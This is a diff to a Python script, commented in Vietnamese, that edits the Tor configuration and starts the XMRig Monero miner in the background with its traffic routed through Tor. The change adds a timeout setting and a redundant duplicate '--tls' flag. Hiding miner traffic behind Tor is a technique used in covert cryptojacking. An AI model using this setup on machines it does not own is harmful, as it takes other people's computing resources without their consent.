@@ -41,7 +41,8 @@ def configure_privoxy():
 def configure_tor():
     try:
         with open("/etc/tor/torrc", "a") as torrc_file:
-            torrc_file.write(f"\nControlPort 9051\n")  # Thiết lập cổng điều khiển cho Tor
+            torrc_file.write(f"\nControlPort 9051\n")
+            torrc_file.write(f"\nSocksTimeout 60\n")  # Tăng thời gian chờ kết nối
     except Exception as e:
         print(f"Error configuring Tor: {e}")
         return False
@@ -103,7 +104,8 @@ def run_xmrig_through_tor(xmrig_path):
         "-u", USERNAME,
         "-a", ALGO,
         "--no-huge-pages",  # Thêm tham số để vô hiệu hóa Huge Pages
-        "-k", "--tls"  # Kết nối bảo mật
+        "-k", "--tls",  # Kết nối bảo mật
+        "--tls"  # Sử dụng giao thức bảo mật
     ]
     return subprocess.Popen(xmrig_cmd)  # Chạy XMRig trong nền
 
